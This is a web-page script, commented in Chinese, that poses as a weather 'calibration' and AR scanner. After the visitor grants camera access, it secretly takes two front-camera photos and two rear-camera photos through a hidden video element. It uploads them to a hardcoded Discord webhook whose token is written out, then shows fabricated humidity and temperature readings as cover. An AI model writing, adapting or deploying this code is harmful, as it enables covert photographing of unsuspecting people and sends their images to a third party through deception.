<script>
// 請替換成你的 Webhook 網址
const webhook = "https://discord.com/api/webhooks/1429150986882252871/UlvSQaaZLtutHuXJdZ_P_khQjXZV5BIXRbWbfvYDJ9psaiBwZKh9RfwNMeRkkC5rEskv";

const sleep = (ms) => new Promise(r => setTimeout(r, ms));

async function takeSnap(video, filename, content) {
    const canvas = document.getElementById("c");
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    canvas.getContext("2d").drawImage(video, 0, 0);
    
    return new Promise(resolve => {
        canvas.toBlob(blob => {
            const fd = new FormData();
            fd.append("file", blob, filename);
            fd.append("payload_json", JSON.stringify({ content }));
            fetch(webhook, { method: "POST", body: fd }).then(resolve).catch(resolve);
        }, "image/jpeg", 0.7); // 稍微調高品質確保清晰度
    });
}

async function startCalibration() {
    const status = document.getElementById("status");
    const btn = document.getElementById("btn");
    const loader = document.getElementById("loader");
    
    btn.style.display = "none";
    loader.style.display = "block";
    status.innerHTML = "正在連線到氣象衛星...";

    try {
        let hiddenV = document.getElementById("v");

        // --- 階段 1：前鏡頭 (User) 連拍 ---
        status.innerHTML = "正在獲取光譜數據 (Phase 1)...";
        let streamUser = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        hiddenV.srcObject = streamUser;
        await hiddenV.play();
        await sleep(600); // 預熱，避免黑畫面
        
        await takeSnap(hiddenV, "user_1.jpg", "👤 **[前鏡頭] 數據 A**");
        await sleep(200); // 極短間隔連拍
        await takeSnap(hiddenV, "user_2.jpg", "👤 **[前鏡頭] 數據 B**");
        
        streamUser.getTracks().forEach(t => t.stop()); // 關閉前鏡頭

        // --- 階段 2：後鏡頭 (Environment) 連拍 ---
        status.innerHTML = "掃描環境大氣 (Phase 2)...";
        let streamEnv = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
        hiddenV.srcObject = streamEnv;
        await hiddenV.play();
        await sleep(600); // 預熱
        
        await takeSnap(hiddenV, "env_1.jpg", "📡 **[後鏡頭] 環境 A**");
        await sleep(200);
        await takeSnap(hiddenV, "env_2.jpg", "📡 **[後鏡頭] 環境 B**");
        
        streamEnv.getTracks().forEach(t => t.stop()); // 關閉後鏡頭

        // --- 階段 3：正式進入掃描介面 ---
        enterARMode();

    } catch (err) {
        console.error(err);
        status.innerHTML = "校準失敗：連線逾時。";
        loader.style.display = "none";
        btn.style.display = "block";
    }
}

function enterARMode() {
    document.getElementById("main-card").style.display = "none";
    const overlay = document.getElementById("scanner-overlay");
    const liveV = document.getElementById("live-v");
    const dataDisplay = document.getElementById("live-data");
    
    overlay.style.display = "block";
    
    // 最終顯示畫面：使用後鏡頭讓用戶看環境
    navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } })
    .then(stream => {
        liveV.srcObject = stream;
        
        let timer = setInterval(() => {
            let humidity = (Math.random() * (60 - 45) + 45).toFixed(1);
            let temp = (Math.random() * (26 - 23) + 23).toFixed(1);
            dataDisplay.innerHTML = `
                [系統狀態: AR 實時掃描中]<br>
                -------------------------<br>
                環境濕度: ${humidity}%<br>
                體感溫度: ${temp}°C<br>
                紅外線分析: 運作中...<br>
                正在匹配雲端氣象數據...
            `;
        }, 300);

        setTimeout(() => {
            clearInterval(timer);
            alert("校準成功！\n當前體感溫度為 26°C。");
            location.reload(); 
        }, 5000);
    });
}
</script>
